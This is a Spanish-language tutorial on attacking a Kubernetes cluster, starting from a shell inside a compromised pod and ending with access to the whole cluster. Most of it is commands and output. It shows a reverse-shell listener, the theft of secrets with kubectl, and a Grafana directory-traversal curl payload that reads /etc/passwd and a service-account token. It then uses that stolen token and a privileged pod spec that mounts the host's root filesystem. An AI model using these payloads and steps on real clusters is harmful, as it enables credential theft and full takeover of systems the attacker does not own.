# Atacar un cluster de Kubernetes: dedes un pod a todo el cluster


 Esta basado en el video : https://www.youtube.com/watch?v=iD_klswHJQs


## Enumeración 

Si hacemos una nmap a una IP que tiene una aplicación que está en un cluster:

```console
$ nmap -v <IP>

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http

```
Obtendremos los puertos 80/443 de la aplicación y probablemente el puerto 22.

## Establecimiento inicial

Suponer que hemos conseguido abrir un shell en el contenedor aprovechando una vulnerabilidad como inyección de OS o de SQL.

Para ello se puede usar netcat pero hay herramientas interesantes como `pwncat-cs`:
```console
$ sudo pip install pwncat-cs

$ pwncat-cs -lp <LPORT>
```

Una vez abierto el shell, probablemente seamos `root` aunque veremos que el conjunto de instrucciones de las que disponemos es bastante limitado dentro del contenedor.

¿Cómo se sabe que estás dendro de un contenedor?

Hay varios indicios:

- Probablemente en habrá un archivo `/.dockerenv`
- El comando `env` tendrá información de diversos compenentes :
   ```
   KUBERNETES_PORT_443_TCP_PROTO=
   KUBERNETES_PORT_443_TCP_ADDR=
   KUBERNETES_SERVICE_HOST=
   KUBERNETES_PORT=
   ...
   GRAFANA_...=
   SYRINGE_...=
   ```


Por defecto, Kubernetes crea variables de entorno que contienen el host y el puerto de otros servicios en ejecución en el cluster.


## Instalar kubectl

`kubectl`es la herramienta que permite gestionar un cluster de Kubernetes. Por tanto, es imprescindible para poder ejecurtarlo en el pod comprometido.

Una opción es subirlo al pod desde la maquina atacante con un `upload`, hacerlo accesible con un servidor web, ...

```console
cd /tmp

pwncat$ upload ./kubectl

chmod +x ./kubectl

```

Una vez disponemos de `kubectl` podemos comenzar a lanzar comandos contra el cluster de kubernetes.

Lo primero que podemos hacer es ver qué podemos hacer en  el clúster. Para ello, el siguiente comando nos dará esa respuesta
```console

$ ./kubectl auth can-i --list 

...
secrets []     []       [get list]
   [/openapi]  []       [get]       
    [/version] []       [get]      
...
```

Lo más interesante es que `secrets` son accesibles:
```console

$ ./kubectl get secrets

default-token-xxxxx   kubernetes.io/service-account-token    3  24d
developer-token-yyy   kubernetes.io/service-account-token    3  24d
   
...
```
Para ver el contenido de un  `secrets` se puede usar:

```console
$ ./kubectl get secrets developer-token-yyy -o json

{
   data:{
      ...
   }
}
...
```

Probablemente no tengamos permisos para ver otros pods que estén en ejecución:

```console
$ ./kubectl get pods
Error from server (Forbidden): ...
```

```console
$ curl -vvv http://grafana:3000 


$ curl -L http://grafana:3000 

```
Como conocemos que puede haber otros servicios ejecutando en el clúster (ver los resultados del comando `env`) intentamos conectar a esos servicios conociendo la IP y el puerto:

```console
$ curl -vvv http://grafana:3000 


$ curl -L http://grafana:3000 

```

Y buscar versiones vulnerables en alguno de los servicios. Por ejemplo, Grafana 8.3.0 que es vulnerable a Directory Traversal y es posible leer cualquier archivo (https://www.exploit-db.com/exploits/50581).

```console
$ curl --path-as-is http://grafana:3000/public/plugings/logs/../../../../../../../../../../../../../../etc/passwd 


```

El objetivo es obtener más `secrets`. Si buscamos en el pod comprometido vemos dónde pueden estar estos `secrets`, concretamente el token de acceso (JWT):

```console
$ cd /var/run/secrets/kubernetes.io/serviceaccount
$ ls
ca.crt   namespace   token
$ cat token
ey .....Xw
```
Por tanto, buscamos en el pod grafana el token de acceso:
```console
$ curl --path-as-is http://grafana:3000/public/plugings/logs/../../../../../../../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token 

ey...rQ

$ export TOKEN = 'ey...rQ'
```
A continuación, usamos ese token para acceder a ver qué permisos tenemos con él:
```console

$ ./kubectl auth can-i --list --token=$TOKEN

*.*   []     [*]       []
...

$ ./kubectl auth can-i create pods --token=$TOKEN

$ ./kubectl get secrets --token=$TOKEN

```
La última instrucción enumera todos los `secrets` en el clúster de Kubernetes. Los ``secrets` son objetos de Kubernetes que almacenan información sensible, como claves API, contraseñas y certificados.

Incluso podemos abrir sesión en el pod de grafana:
```console

$ ./kubectl exec -it grafana-123455-xyz --token=$TOKEN -- /bin/bash

bash-5.1$ whoami
grafana
```

Prácticamente, ya somos administradores del cluster, pues ya es posible hacer casi cualquier cosa.
```console

$ ./kubectl get pods --token=$TOKEN

grafana-123445566-xxxx    1/1      Running       2      24d
...
```

Ahora ya es posible que podamos iniciar un pod en el cluster. Uno que puede ser interesante es 'Bishop Fox' que se encuentra en una colección de Bad Pods para permitir escalado de privilegios (https://bishopfox.com/blog/kubernetes-pod-privilege-escalation).

Elegimos uno de ellos que nos permita acceso a todos los elementos del cluster. Lo más importante de esta especificación es la parte en la que monta el volumen en '/host':

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: ubuntu
    imagePullPolicy: IfNotPresent # añadir para que se descargue
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
```
Subimos este archivo al pod para poder aplicarlos.

```console

pwncat$ upload ./privscal.yaml


$ ./kubectl apply -f privscal.yaml --token=$TOKEN
pod created
```
Sin embargo, el pod no se está ejecutando porque no se puede descargar la imagen ya que no se tiene acceso a internet para acceder al registro de imágenes. 
```console
$ ./kubectl describe pod everything-allowed-exec-pod  --token=$TOKEN
...
Failed to pull image "ubuntu" ...
...
```
Tendremos que buscar una imagen entre las ya existentes

```console
$ ./kubectl --token=$TOKEN get pods --all-namespaces -o jsonpath="{.items[*].spec['containers'][*].image"
```

Si hay alguna imagen que nos pueda valer, se modifica el archivo `privscal.yaml` con la imagen, supongamos que es `syringe:latest` 

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: syringe:latest
    imagePullPolicy: IfNotPresent # añadir para que se descargue
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
```


```console

$ ./kubectl delete pod everything-allowed-exec-pod  --token=$TOKEN # borramos primero el anterior
$ ./kubectl apply -f privscal.yaml --token=$TOKEN


$ ./kubectl get pods --token=$TOKEN # comprobar que se está ejecutando
NAME                              READY
everything-allowed-exec-pod         1/1        Running
...
```

A nos podemos conectar a este pod recien creado y en ejecución:
```console

$ ./kubectl exec -it everything-allowed-exec-pod --token=$TOKEN -- /bin/bash

```
Aunque parece que seguimos en el mismo contendor, se ha montado en el directorio /host todo el sistema de archivos del huesped y hay acceso a todos los archivos y directorios del root.























